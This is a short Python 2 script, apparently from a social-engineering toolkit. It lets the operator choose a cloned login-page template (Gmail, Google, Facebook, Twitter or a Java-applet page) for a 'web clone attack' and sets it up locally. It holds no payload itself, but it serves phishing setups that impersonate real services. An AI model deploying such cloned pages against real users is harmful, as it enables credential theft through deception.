#!/usr/bin/env python
import subprocess,os
#
# used for pre-defined templates
#
print """
   Select a template to utilize within the web clone attack

    1. Java Required 
    2. Gmail
    3. Google
    4. Facebook
    5. Twitter
"""
choice=raw_input("   Enter the one to use: ")

# file used for nextpage in java applet attack
filewrite=file("src/program_junk/site.template", "w")

# if nothing is selected
if choice == "": choice = "1"

# if java required
if choice == "1":
	subprocess.Popen("cp src/html/templates/java/index.template src/html/ 1> /dev/null 2> /dev/null", shell=True).wait()
	URL=""

# if gmail
if choice == "2":
	subprocess.Popen("cp src/html/templates/gmail/index.template src/html/ 1> /dev/null 2> /dev/null", shell=True).wait()
	URL="https://gmail.com"

# if google
if choice == "3":
	subprocess.Popen("cp src/html/templates/google/index.template src/html 1> /dev/null 2> /dev/null", shell=True).wait()
	URL="http://www.google.com"

# if facebook
if choice == "4":
	subprocess.Popen("cp src/html/templates/facebook/index.template src/html 1> /dev/null 2> /dev/null", shell=True).wait()
	URL="http://www.facebook.com"

# if twitter
if choice == "5":
	subprocess.Popen("cp src/html/templates/twitter/index.template src/html 1> /dev/null 2> /dev/null", shell=True).wait()
	URL="http://www.twitter.com"

subprocess.Popen("mkdir src/webattack/web_clone/site/template 1> /dev/null 2>/dev/null;cp src/html/index.template src/webattack/web_clone/site/template/index.html 1> /dev/null 2> /dev/null", shell=True)

filewrite.write("TEMPLATE=SELF" + "\n"+"URL=%s" % (URL))
filewrite.close()
